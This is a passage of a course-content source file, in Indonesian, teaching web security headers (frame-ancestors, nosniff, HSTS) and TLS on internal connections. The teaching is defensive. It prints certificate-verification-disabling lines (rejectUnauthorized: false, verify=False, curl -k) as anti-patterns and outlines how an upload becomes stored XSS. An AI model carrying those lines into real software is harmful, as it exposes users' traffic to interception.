      p(
        'Yang membuat serangan ini berhasil adalah sesi korban tetap aktif di dalam bingkai itu, jadi halamanmu memperlakukan kliknya sebagai tindakan sah dari pengguna yang sudah login. Tidak ada validasi input yang bisa menolongmu di sini, karena permintaannya memang benar-benar datang dari pengguna itu.',
      ),
      p(
        'Perbaikannya bukan di dalam aplikasi, melainkan satu baris header yang menyuruh browser menolak menampilkan halamanmu di dalam bingkai milik orang lain.',
      ),

      h2('Daftar header dan tugas masing-masing'),
      table(
        ['Header', 'Nilai yang dianjurkan', 'Menutup apa'],
        [
          [
            '`Content-Security-Policy: frame-ancestors`',
            "`'none'` atau daftar origin",
            'Clickjacking',
          ],
          [
            '`X-Content-Type-Options`',
            '`nosniff`',
            'Berkas unggahan yang ditebak sebagai HTML lalu dieksekusi',
          ],
          [
            '`Referrer-Policy`',
            '`strict-origin-when-cross-origin`',
            'Kebocoran alamat halaman beserta id di dalamnya',
          ],
          [
            '`Strict-Transport-Security`',
            '`max-age=31536000; includeSubDomains`',
            'Penurunan koneksi ke HTTP, dibahas di sub-bab berikutnya',
          ],
          [
            '`Permissions-Policy`',
            '`camera=(), microphone=(), geolocation=()`',
            'Penyalahgunaan kemampuan perangkat oleh skrip pihak ketiga',
          ],
          ['`X-Frame-Options`', '`DENY`', 'Sama seperti `frame-ancestors`, untuk browser lama'],
        ],
      ),
      p(
        'Baris kedua layak dijelaskan karena akibatnya sering diremehkan. Tanpa `nosniff`, sebuah berkas yang diunggah pengguna dan kamu sajikan sebagai `text/plain` bisa ditebak browser sebagai HTML karena isinya diawali tag. Begitu ditebak sebagai HTML, skrip di dalamnya berjalan di origin situsmu, sehingga unggahan berkas berubah menjadi XSS tersimpan.',
      ),
      p(
        'Urutan kejadiannya begini. Pengguna mengunggah berkas bernama `catatan.txt` yang isinya diawali `<script>...</script>`, servermu menyajikannya dengan `Content-Type: text/plain`, lalu browser lama melihat isinya lebih mirip HTML daripada teks biasa dan memutuskan menampilkannya sebagai HTML. Sejak saat itu skrip di dalamnya berjalan di origin situsmu, dengan akses penuh ke cookie yang tidak bertanda `HttpOnly` dan ke seluruh API-mu atas nama korban.',
      ),
      p(
        'Header `nosniff` menghapus keputusan itu dari tangan browser. Isinya berbunyi bahwa jenis yang kamu sebutkan adalah jenis yang berlaku, tanpa tebakan. Biaya memasangnya nol untuk aplikasi yang menyebutkan `Content-Type` dengan benar, dan satu-satunya hal yang berhenti bekerja adalah kebiasaan lama menyajikan berkas dengan jenis yang salah lalu berharap browser membetulkannya.',
      ),

      p(
        'Baris terakhir ada demi browser lama yang belum mengenal `frame-ancestors`. Keduanya boleh dipasang bersamaan, dan browser modern akan mengutamakan directive CSP. Ini salah satu dari sedikit kasus tempat memasang dua hal yang tumpang tindih memang dianjurkan.',
      ),

      h2('Memasangnya di Express dan Laravel'),
      code(
        'js',
        `
        import helmet from 'helmet';

        app.use(
          helmet({
            contentSecurityPolicy: {
              directives: {
                defaultSrc: ["'self'"],
                scriptSrc: ["'self'"],
                objectSrc: ["'none'"],
                baseUri: ["'self'"],
                frameAncestors: ["'none'"],
              },
            },
            hsts: { maxAge: 31536000, includeSubDomains: true },
            referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
          }),
        );

        app.use((req, res, next) => {
          res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
          next();
        });
        `,
      ),
      p(
        'Helmet memasang `X-Content-Type-Options`, `X-Frame-Options`, dan beberapa header lain dengan nilai bawaannya, jadi yang perlu kamu tulis hanyalah yang ingin kamu sesuaikan. Ini alasan memakai Helmet lebih baik daripada menulis semua header sendiri, sebab daftar anjurannya diperbarui library-nya seiring waktu.',
      ),
      p(
        'Perhatikan `Permissions-Policy` dipasang terpisah dengan middleware biasa. Header itu memang belum menjadi bagian bawaan Helmet, dan bentuk `camera=()` dengan tanda kurung kosong berarti tidak ada satu pun origin yang boleh memakai kemampuan tersebut, termasuk halamanmu sendiri.',
      ),
      code(
        'php',
        `
        class HeaderKeamanan
        {
            public function handle($request, Closure $next)
            {
                $response = $next($request);

                $response->headers->set('X-Content-Type-Options', 'nosniff');
                $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
                $response->headers->set('Permissions-Policy', 'camera=(), microphone=()');
                $response->headers->set(
                    'Content-Security-Policy',
                    "default-src 'self'; frame-ancestors 'none'; object-src 'none'"
                );

                return $response;
            }
        }
        `,
        { filename: 'app/Http/Middleware/HeaderKeamanan.php' },
      ),
      p(
        'Perhatikan header dipasang **sesudah** `$next($request)` dipanggil. Urutan itu wajib, karena `$next` yang menjalankan sisa aplikasi dan menghasilkan objek respons. Memasang header sebelum baris itu berarti kamu memodifikasi respons yang belum ada.',
      ),

      h2('Membuktikan header benar-benar terpasang'),
      code(
        'bash',
        `
        curl -sI https://app.toko.com | grep -iE \\
          'content-security-policy|x-content-type|referrer-policy|strict-transport|permissions-policy'
        `,
      ),
      p(
        'Opsi `-I` meminta hanya headernya saja, dan `-s` menyembunyikan indikator kemajuan supaya keluarannya bersih. Perintah ini adalah bukti, bukan asumsi. Header bisa hilang karena middleware yang tidak jadi terpasang, karena proxy di depan aplikasi yang membuangnya, atau karena route tertentu yang melewati middleware.',
      ),
      p(
        'Jalankan perintah ini terhadap **alamat produksi**, bukan hanya di komputermu. Perbedaan antara keduanya justru sering terjadi, terutama ketika ada CDN atau reverse proxy yang menulis ulang sebagian header.',
      ),
      callout(
        'tip',
        'Header adalah pertahanan termurah yang kamu punya',
        'Tidak ada logika aplikasi yang berubah, tidak ada query yang perlu ditulis ulang, dan waktunya kurang dari satu jam. Pasang sejak awal proyek, lalu verifikasi dengan `curl -I` setiap kali menambah proxy atau CDN di depan aplikasi.',
      ),

      references(
        {
          label: 'Clickjacking Defense Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa `frame-ancestors` lebih dianjurkan daripada trik JavaScript.',
        },
        {
          label: 'X-Content-Type-Options',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options',
          source: 'MDN',
          note: 'Penjelasan MIME sniffing dan apa yang ditutup nilai `nosniff`.',
        },
        {
          label: 'Referrer-Policy',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy',
          source: 'MDN',
          note: 'Perbandingan setiap nilai beserta apa yang bocor pada masing-masing.',
        },
        {
          label: 'Permissions-Policy',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy',
          source: 'MDN',
          note: 'Daftar kemampuan yang bisa dimatikan beserta sintaks nilainya.',
        },
        {
          label: 'CSP: frame-ancestors',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors',
          source: 'MDN',
          note: 'Rujukan resmi directive yang menutup clickjacking.',
        },
      ),
    ],
  ),

  written(
    'tls-setiap-hop',
    'TLS di Setiap Hop',
    12,
    'Gembok di address bar hanya menjaga satu ruas perjalanan.',
    [
      p(
        'Hampir setiap aplikasi sekarang memakai HTTPS di sisi publik, dan itu bagus. Yang sering terlewat adalah perjalanan data tidak berhenti di situ. Sesudah permintaan sampai di load balancer, ia masih harus berjalan ke server aplikasi, lalu ke database, lalu mungkin ke layanan lain. Kalau ruas-ruas itu memakai koneksi biasa, gemboknya hanya melindungi bagian pertama.',
      ),
      p(
        'Pola ini disebut TLS Everywhere, dan ia adalah bentuk konkret dari sikap zero trust yang dibahas di sub-bab pertama. Berada di dalam jaringan yang sama bukan alasan untuk berhenti melindungi lalu lintasnya.',
      ),

      terms(
        {
          term: 'TLS',
          meaning:
            'Singkatan dari **Transport Layer Security**, penerus SSL yang namanya masih sering dipakai. Tugasnya mengenkripsi data selama perjalanan sekaligus membuktikan bahwa lawan bicaranya memang server yang dituju. Kedua tugas itu sama pentingnya, dan yang kedua sering dilupakan.',
        },
        {
          term: 'HTTPS',
          meaning:
            'HTTP yang berjalan di atas TLS. Bukan protokol berbeda, melainkan protokol yang sama di dalam lapisan terenkripsi. Karena itu semua yang kamu tahu tentang HTTP tetap berlaku, hanya isinya tidak lagi bisa dibaca penyadap.',
        },
        {
          term: 'sertifikat dan CA',
          meaning:
            'Sertifikat adalah dokumen digital yang menyatakan bahwa sebuah kunci publik memang milik nama domain tertentu. CA adalah **Certificate Authority**, pihak yang menandatangani pernyataan itu dan sudah dipercaya browser sejak awal. Verifikasi sertifikat adalah cara klien memastikan ia tidak sedang bicara dengan penyamar.',
        },
        {
          term: 'MITM',
          meaning:
            'Singkatan dari **Man in the Middle**, yaitu pihak yang menyisip di tengah percakapan lalu membaca atau mengubah isinya. Contoh nyatanya adalah titik WiFi publik palsu. TLS yang diverifikasi dengan benar membuat penyisipan ini gagal, karena penyamar tidak punya sertifikat yang sah untuk nama domain itu.',
        },
        {
          term: 'HSTS',
          meaning:
            'Singkatan dari **HTTP Strict Transport Security**. Sebuah header yang menyuruh browser mengingat bahwa domain ini hanya boleh diakses lewat HTTPS, untuk jangka waktu tertentu. Sesudah diingat, browser mengganti sendiri alamat HTTP menjadi HTTPS **sebelum** permintaan pertama dikirim.',
        },
        {
          term: 'mixed content',
          meaning:
            'Halaman HTTPS yang memuat sumber daya lewat HTTP biasa, misalnya gambar atau skrip. Berbahaya terutama untuk skrip, karena penyadap bisa mengganti isinya di tengah jalan dan skrip pengganti itu berjalan penuh di halamanmu yang terenkripsi.',
        },
        {
          term: 'TLS termination',
          meaning:
            'Titik tempat enkripsi dibuka, biasanya di load balancer atau reverse proxy. Sesudah titik itu, lalu lintas berjalan sebagai HTTP biasa kecuali kamu mengaturnya lain. Mengetahui letak titik ini penting, karena di situlah pertanyaan "ruas mana yang masih terbuka" mulai bisa dijawab.',
        },
      ),

      h2('Ruas yang sering terlupa'),
      table(
        ['Ruas perjalanan', 'Sering dilindungi?', 'Risiko bila terbuka'],
        [
          ['Browser ke load balancer', 'Ya, hampir selalu', 'Sesi dan password terbaca penyadap'],
          [
            'Load balancer ke server aplikasi',
            'Sering tidak',
            'Siapa pun di jaringan itu bisa membaca seluruh lalu lintas',
          ],
          [
            'Server aplikasi ke database',
            'Sering tidak',
            'Isi tabel terbaca, termasuk data pribadi',
          ],
          [
            'Server aplikasi ke cache atau antrean',
            'Jarang',
            'Token sesi yang tersimpan di cache terbaca',
          ],
          [
            'Server aplikasi ke API pihak ketiga',
            'Biasanya ya',
            'Kunci API bocor bila verifikasi dimatikan',
          ],
        ],
      ),
      p(
        'Baris keempat paling sering luput dari perhatian karena cache terasa seperti detail teknis, padahal isinya justru padat data sensitif. Banyak aplikasi menyimpan sesi pengguna di Redis, sehingga koneksi cache yang terbuka sama artinya dengan membiarkan daftar sesi aktif terbaca oleh siapa pun yang bisa menyadap jaringan itu.',
      ),
      p(
        'Contoh konkretnya begini. Aplikasi Express dengan `connect-redis` menyimpan seluruh isi sesi di Redis, dan isi itu biasanya memuat id pengguna, peran, dan kadang data profil. Kalau koneksi ke Redis berjalan tanpa enkripsi di jaringan yang sama dengan layanan lain, siapa pun yang bisa menyadap jaringan itu memperoleh daftar sesi aktif yang bisa langsung dipakai menyamar sebagai penggunamu.',
      ),
      p(
        'Antrean pekerjaan punya masalah yang sebangun. Payload job sering memuat alamat email penerima, isi notifikasi, dan kadang token sekali pakai untuk tautan verifikasi. Semua itu melintas sebagai teks biasa bila koneksi ke antrean tidak dienkripsi, dan tidak ada satu pun bagian aplikasi yang akan memberi tahumu bahwa hal itu sedang terjadi.',
      ),
      p(
        'Alasan ruas kedua dan ketiga sering dibiarkan terbuka selalu sama, yaitu anggapan bahwa jaringan internal sudah aman. Anggapan itulah yang ditolak zero trust. Satu container yang disusupi, satu akun VPN yang bocor, atau satu kesalahan konfigurasi jaringan sudah cukup untuk menempatkan penyerang di dalam jaringan yang dianggap aman itu.',
      ),

      h2('HSTS dan mengapa permintaan pertama penting'),
      code(
        'js',
        `
        app.use(
          helmet.hsts({
            maxAge: 31536000,      // satu tahun dalam detik
            includeSubDomains: true,
            preload: true,
          }),
        );

        // Mengarahkan HTTP ke HTTPS, di lapisan aplikasi maupun di proxy.
        app.use((req, res, next) => {
          if (req.headers['x-forwarded-proto'] === 'http') {
            return res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
          }
          next();
        });
        `,
      ),
      p(
        'Pengalihan di bagian bawah memang perlu, tetapi ia punya satu kelemahan yang tidak bisa diperbaiki. Pengalihan baru terjadi **sesudah** permintaan pertama terkirim lewat HTTP, dan pada permintaan itu cookie serta alamat yang dituju sudah melintas dalam keadaan terbuka. HSTS menutup celah itu dengan membuat browser mengganti sendiri protokolnya sebelum mengirim apa pun.',
      ),
      p(
        'Isi kebocoran pada permintaan pertama itu perlu dibayangkan konkret. Yang melintas terbuka adalah baris permintaan lengkap beserta jalur dan query, seluruh header termasuk `Cookie`, dan `User-Agent`. Kalau pengguna mengetik `toko.com/pesanan/1042` di address bar, penyadap memperoleh cookie sesinya sekaligus mengetahui nomor pesanan yang sedang ia buka.',
      ),
      p(
        'Sesudah HSTS tersimpan di browser, urutan itu berubah sepenuhnya. Browser mengganti `http` menjadi `https` di dalam dirinya sendiri sebelum satu byte pun dikirim, sehingga permintaan terbuka tadi tidak pernah ada. Yang perlu diingat, perlindungan ini baru berlaku sesudah kunjungan pertama yang berhasil, dan hanya daftar preload yang menutup kunjungan pertama itu juga.',
      ),
      p(
        'Nilai `maxAge: 31536000` berarti satu tahun. Angka sebesar itu dianjurkan karena perlindungannya baru bekerja selama browser masih mengingatnya. Perlu diingat juga bahwa ingatan ini sulit dibatalkan, jadi jangan menyalakan `includeSubDomains` sebelum kamu yakin **semua** subdomain sudah siap melayani HTTPS.',
      ),
      p(
        'Nilai `preload: true` mengumumkan niat untuk didaftarkan ke daftar bawaan browser, sehingga bahkan kunjungan pertama pun langsung memakai HTTPS. Pendaftaran itu dilakukan terpisah lewat proses tersendiri, dan sekali masuk daftar, keluar dari sana memakan waktu lama. Perlakukan sebagai keputusan permanen.',
      ),
      p(
        'Pemeriksaan `x-forwarded-proto` dipakai karena aplikasi berada di belakang proxy yang sudah membuka enkripsi. Dari sudut pandang aplikasi, koneksinya memang HTTP, jadi memeriksa `req.secure` saja akan salah menilai. Header inilah yang membawa informasi protokol asli dari sisi pengguna.',
      ),

      h2('Kesalahan yang membatalkan seluruh manfaat TLS'),
      code(
        'js',
        `
        // JANGAN PERNAH, bahkan di skrip internal.
        const agent = new https.Agent({ rejectUnauthorized: false });

        // Python
        // requests.get(url, verify=False)

        // curl
        // curl -k https://...
        `,
      ),
      p(
        'Ketiga bentuk itu melakukan hal yang sama, yaitu mematikan verifikasi sertifikat. Enkripsinya memang masih berjalan, tetapi tugas kedua TLS hilang sepenuhnya. Klien tidak lagi memeriksa siapa lawan bicaranya, sehingga penyerang yang menyisip di tengah cukup menyodorkan sertifikat buatannya sendiri dan koneksinya diterima.',
      ),
      p(
        'Bentuk ini biasanya lahir dari niat baik, misalnya sertifikat pengembangan yang belum sah atau sertifikat yang kedaluwarsa pada Jumat malam. Masalahnya, baris seperti ini nyaris tidak pernah dihapus lagi, dan ia ikut terbawa ke produksi tanpa ada yang menyadari. Kalau kamu benar-benar butuh sertifikat sendiri untuk pengembangan, tambahkan sertifikat CA-mu ke daftar tepercaya alih-alih mematikan pemeriksaannya.',
      ),
      code(
        'js',
        `
        // Prisma dan sebagian besar driver database menerima parameter sslmode.
        // postgresql://pengguna:sandi@host:5432/basisdata?sslmode=verify-full
        `,
      ),
      p(
        'Nilai `verify-full` adalah yang paling ketat, karena ia memeriksa keabsahan sertifikat sekaligus memastikan namanya cocok dengan host yang dituju. Nilai `require` yang lebih sering dipakai hanya menuntut koneksinya terenkripsi tanpa memeriksa siapa lawan bicaranya, sehingga ia tetap terbuka terhadap penyamaran.',
      ),
      callout(
        'danger',
        'Enkripsi tanpa verifikasi bukan keamanan',
        'TLS punya dua tugas, yaitu menyembunyikan isi dan membuktikan identitas. Mematikan verifikasi sertifikat membuang tugas kedua, dan tanpa tugas kedua, tugas pertama menjadi tidak berarti karena kamu bisa saja sedang mengenkripsi percakapan dengan penyerang.',
      ),

      h2('Ringkas'),
      ol(
        'Pakai HTTPS di sisi publik, lalu pasang HSTS supaya permintaan pertama pun terlindung.',
        'Enkripsi juga ruas internal, yaitu ke database, ke cache, dan antar layanan.',
        'Jangan pernah mematikan verifikasi sertifikat di lingkungan mana pun.',
        'Pasang penanda `Secure` pada setiap cookie sesi.',
        'Pantau tanggal kedaluwarsa sertifikat, karena perpanjangan yang terlambat mendorong orang mengambil jalan pintas berbahaya.',
      ),

      references(
        {
          label: 'Strict-Transport-Security',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security',
          source: 'MDN',
          note: 'Arti setiap parameter HSTS termasuk peringatan soal preload.',
        },
        {
          label: 'Transport Layer Protection Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Anjuran konfigurasi TLS termasuk untuk lalu lintas internal.',
        },
        {
          label: 'Mixed content',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content',
          source: 'MDN',
          note: 'Perbedaan mixed content pasif dan aktif beserta perlakuan browser.',
        },
        {
          label: 'TLS (SSL)',
          href: 'https://nodejs.org/api/tls.html',
          source: 'Node.js',
          note: 'Opsi klien TLS termasuk arti sebenarnya dari `rejectUnauthorized`.',
        },
      ),
    ],
  ),
];
